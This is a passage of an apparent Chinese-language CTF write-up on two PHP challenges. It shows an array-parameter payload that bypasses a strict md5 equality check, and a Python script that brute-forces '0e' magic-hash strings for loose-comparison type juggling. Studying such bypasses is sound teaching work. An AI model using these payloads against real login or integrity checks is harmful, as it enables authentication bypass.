0x04 PHP的悖论1

 if ($_POST['s1'] !== $_POST['s2'] && md5($_POST['s1']) === md5($_POST['s2'])) { echo $flag; }

‘===’是全等于符号，不仅值要求相同而且类型也要相同，但是php的md5函数无法处理数组，遇到数组会返回NULL，因此传数组上去

s1[]=1&s2[]=2

0x05 PHP的悖论2

提示上次的方法不能用，因此用php的一个特性–隐式转换，’==’判断的时候，会把字符类型的数字转换成数字。
只要在e之前的是纯0，并且e之后的是纯数字，PHP就会当成科学记数法来处理

var_dump("0e321" == "00e123");//bool(true)

只有md5是0e开头。后面纯数字的情况才会把字符串转成科学计数法，0的N次方=0
脚本跑满足条件的

# -*- coding: utf8 -*-
import hashlib

payload ="QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"
#payload = "qwertyuiopasdfghjklzxcvbnm"
#payload = "0123456789"

def calcMd5(s):
    MD5 = hashlib.md5(s.encode()).hexdigest()
    if MD5[0:2] == "0e" and MD5[2:32].isdigit():
        print(s, MD5)

def getStr(payload, s, slen):
    if len(s) == slen:
        calcMd5(s)
        return s
    for j in range(len(payload)):
        sl = s + payload[j]
        getStr(payload, sl, slen)

if __name__ == '__main__':
    print "go"
    getStr(payload, '', 7)
